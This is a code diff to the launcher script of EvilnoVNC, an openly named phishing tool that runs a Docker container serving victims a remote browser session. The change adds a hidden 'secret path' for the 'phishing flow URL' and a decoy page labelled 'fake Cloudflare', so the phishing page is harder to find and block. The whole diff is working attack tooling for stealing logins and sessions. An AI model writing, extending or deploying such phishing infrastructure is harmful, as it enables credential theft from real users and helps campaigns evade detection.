@@ -16,14 +16,16 @@ printf "\e[1;34m
 
 # Help & Usage
 function help {
-printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url\n\n"
+printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url \e[1;36m[\$secret_path]\n\n"
 printf "\e[1;33mExamples:\n"
 printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
 printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
 printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
 printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
 printf "\e[1;33mDynamic resolution:\n"
-printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n";}
+printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n"
+printf "\e[1;33mOptional secret path (phishing flow URL; default: 12098e2fklj.html):\n"
+printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com \e[1;36mmysecret.html\n\n";}
 
 if [[ $# -lt 2 ]] ; then help
 if [[ $# -lt 2 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
@@ -32,6 +34,7 @@ fi ; exit 0 ; fi
 # Variables
 RESOLUTION=$1
 WEBPAGE=$2
+SECRET_PATH=${3:-12098e2fklj.html}
 
 # Main function
 if docker -v &> /dev/null ; then
@@ -40,15 +43,16 @@ sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
 if [[ $RESOLUTION == dynamic ]]; then
 sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
--v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
+-v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" -e "SECRET_PATH=$SECRET_PATH" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 
 else echo $RESOLUTION > /tmp/resolution.txt
 sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
--v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
+-v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" -e "SECRET_PATH=$SECRET_PATH" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
 
 rm -Rf $PWD/Downloads/*
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
-printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
+printf "\n\e[1;34m[+] Base URL (fake Cloudflare): http://localhost" ; sleep 2
+printf "\n\e[1;34m[+] Phishing flow URL: http://localhost/$SECRET_PATH" ; sleep 2
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2
 
 if [[ $RESOLUTION == dynamic ]]; then
